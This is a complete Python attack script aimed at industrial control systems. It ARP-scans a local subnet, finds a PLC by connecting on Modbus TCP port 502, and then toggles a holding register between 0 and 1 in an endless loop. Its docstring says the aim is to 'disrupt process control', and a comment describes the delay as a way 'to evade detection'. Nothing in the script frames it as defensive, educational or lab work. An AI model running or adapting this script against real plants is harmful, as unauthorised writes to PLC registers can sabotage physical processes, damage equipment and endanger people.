import time
from pyModbusTCP.client import ModbusClient
from scapy.all import ARP, Ether, srp

# Network scan function to find the PLC IP (Assuming Modbus TCP PLC)
def find_plc_ip(network_range="192.168.1.0/24", modbus_port=502):
    """Scans the network to find a Modbus TCP PLC."""
    print("[*] Scanning network for PLC...")
    
    # Send ARP request to all devices in the subnet
    arp_request = ARP(pdst=network_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    answered, _ = srp(broadcast / arp_request, timeout=2, verbose=False)

    for send, recv in answered:
        ip = recv.psrc
        print(f"[+] Found device: {ip}")

        # Check if Modbus TCP port 502 is open (indicating a PLC)
        plc_client = ModbusClient(host=ip, port=modbus_port, auto_open=True)
        if plc_client.open():
            print(f"[✔] PLC detected at IP: {ip}")
            return ip
        else:
            print(f"[-] {ip} is not a PLC.")
    
    print("[X] No PLC found on the network.")
    return None

# Function to brute-force I/O register values
def brute_force_io(plc_ip, register_address=0, values=[0, 1], interval=0.5):
    """Repeatedly toggles Modbus register values to disrupt process control."""
    print(f"[*] Connecting to PLC at {plc_ip}...")
    client = ModbusClient(host=plc_ip, port=502, auto_open=True)
    
    if not client.open():
        print("[X] Failed to connect to PLC.")
        return
    
    print(f"[✔] Connected. Starting brute force attack on register {register_address}...")
    
    while True:
        for value in values:
            # Write value to the Modbus register (Coil or Holding Register)
            success = client.write_single_register(register_address, value)
            
            if success:
                print(f"[+] Wrote value {value} to register {register_address}")
            else:
                print("[X] Failed to write to PLC register.")
            
            time.sleep(interval)  # Small delay to evade detection but still disrupt the process

# Main Execution Flow
if __name__ == "__main__":
    plc_ip = find_plc_ip()

    if plc_ip:
        brute_force_io(plc_ip, register_address=10, values=[0, 1], interval=1)
    else:
        print("[X] No PLC found. Exiting...")